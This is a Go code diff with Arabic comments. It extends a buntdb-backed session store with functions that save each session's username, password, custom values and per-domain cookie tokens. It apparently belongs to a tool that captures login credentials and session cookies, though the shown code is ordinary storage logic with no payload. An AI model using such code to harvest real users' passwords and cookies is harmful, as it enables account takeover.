@@ -295,24 +295,26 @@ func (d *Database) UpdateSessionCookieTokens(sid string, domain string, key stri
 			return err
 		}
 
-		// إنشاء الكوكي إذا لم يكن موجودًا
+		// تأكد من وجود خرائط الكوكيز
 		if s.CookieTokens == nil {
 			s.CookieTokens = make(map[string]map[string]*CookieToken)
 		}
-		if _, ok := s.CookieTokens[domain]; !ok {
+		if s.CookieTokens[domain] == nil {
 			s.CookieTokens[domain] = make(map[string]*CookieToken)
 		}
 
-		// إضافة أو تحديث الكوكي
-		cookieToken := &CookieToken{
+		// تحويل القيمة إلى CookieToken
+		token := &CookieToken{
 			Name:     value["name"],
 			Value:    value["value"],
 			Path:     value["path"],
 			HttpOnly: value["http_only"] == "true",
 		}
-		s.CookieTokens[domain][key] = cookieToken
-
+		
+		// تحديث أو إضافة الكوكي
+		s.CookieTokens[domain][key] = token
 		s.UpdateTime = time.Now().Unix()
+		
 		data, err := json.Marshal(s)
 		if err != nil {
 			return err
@@ -320,6 +322,50 @@ func (d *Database) UpdateSessionCookieTokens(sid string, domain string, key stri
 		_, _, err = tx.Set("session:" + sid, string(data), nil)
 		return err
 	})
-
+	
 	return err
+}
+
+// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
+func (d *Database) UpdateSessionCustom(sid string, name string, value string) error {
+	err := d.db.Update(func(tx *buntdb.Tx) error {
+		session_str, err := tx.Get("session:" + sid)
+		if err != nil {
+			return err
+		}
+
+		s := &Session{}
+		err = json.Unmarshal([]byte(session_str), s)
+		if err != nil {
+			return err
+		}
+
+		// تأكد من وجود خريطة Custom
+		if s.Custom == nil {
+			s.Custom = make(map[string]string)
+		}
+		
+		// تحديث القيمة المخصصة
+		s.Custom[name] = value
+		s.UpdateTime = time.Now().Unix()
+		
+		data, err := json.Marshal(s)
+		if err != nil {
+			return err
+		}
+		_, _, err = tx.Set("session:" + sid, string(data), nil)
+		return err
+	})
+	
+	return err
+}
+
+// UpdateSessionUsername يحدث اسم المستخدم للجلسة
+func (d *Database) UpdateSessionUsername(sid string, username string) error {
+	return d.SetSessionUsername(sid, username)
+}
+
+// UpdateSessionPassword يحدث كلمة المرور للجلسة
+func (d *Database) UpdateSessionPassword(sid string, password string) error {
+	return d.SetSessionPassword(sid, password)
 }
